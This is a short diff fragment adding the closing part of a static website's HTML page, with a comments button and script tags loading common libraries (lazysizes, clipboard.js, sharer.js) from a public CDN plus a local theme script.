+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
